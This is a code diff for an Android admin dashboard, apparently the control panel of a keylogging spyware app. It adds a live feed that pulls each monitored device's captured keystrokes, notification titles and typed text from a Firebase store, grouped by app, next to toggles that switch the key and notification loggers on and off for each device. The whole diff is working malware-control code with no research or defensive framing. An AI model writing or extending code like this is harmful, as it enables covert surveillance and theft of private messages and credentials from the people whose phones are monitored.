@@ -25,7 +25,8 @@ class AdminMainActivity : AppCompatActivity() {
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
-        var notifications: Boolean = true
+        var notifications: Boolean = true,
+        var logFeed: String = "Connecting..."
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -56,13 +57,13 @@ class AdminMainActivity : AppCompatActivity() {
         val dbRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                deviceList.clear()
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
                     if (deviceList.none { it.name == deviceName }) {
                         val device = DeviceModel(deviceName)
                         deviceList.add(device)
                         listenToDeviceState(deviceName)
+                        listenToDeviceLogs(deviceName)
                     }
                 }
                 adapter.notifyDataSetChanged()
@@ -93,6 +94,32 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
+    private fun listenToDeviceLogs(deviceName: String) {
+        val logRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName)
+        logRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val sb = StringBuilder()
+                for (appChild in snapshot.children) {
+                    val appName = appChild.key ?: continue
+                    for (entry in appChild.children) {
+                        val text = entry.child("text").getValue(String::class.java)
+                            ?: entry.child("title").getValue(String::class.java)
+                            ?: entry.child("typedContent").getValue(String::class.java)
+                            ?: "activity"
+                        sb.append("[$appName] $text\n")
+                    }
+                }
+                val index = deviceList.indexOfFirst { it.name == deviceName }
+                if (index != -1) {
+                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent logs."
+                    adapter.notifyItemChanged(index)
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
     class DeviceAdapter(
         private val devices: List<DeviceModel>,
         private val onToggle: (DeviceModel, String, Boolean) -> Unit
@@ -102,6 +129,7 @@ class AdminMainActivity : AppCompatActivity() {
             val txtName: TextView = view.findViewById(R.id.txtDeviceName)
             val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
             val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
+            val txtLog: TextView = view.findViewById(R.id.txtDeviceLogConsole)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -111,23 +139,25 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = "Device: ${device.name}"
+            holder.txtName.text = "📱 Device: ${device.name}"
 
             if (device.keylogging) {
-                holder.btnKey.text = "Key Logger: ENABLED"
+                holder.btnKey.text = "Key Logger: ON"
                 holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
             } else {
-                holder.btnKey.text = "Key Logger: DISABLED"
+                holder.btnKey.text = "Key Logger: OFF"
                 holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
             }
 
             if (device.notifications) {
-                holder.btnNotif.text = "Notification Logger: ENABLED"
+                holder.btnNotif.text = "Notif Logger: ON"
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
             } else {
-                holder.btnNotif.text = "Notification Logger: DISABLED"
+                holder.btnNotif.text = "Notif Logger: OFF"
                 holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
             }
+
+            holder.txtLog.text = device.logFeed
 
             holder.btnKey.setOnClickListener {
                 onToggle(device, "key", !device.keylogging)
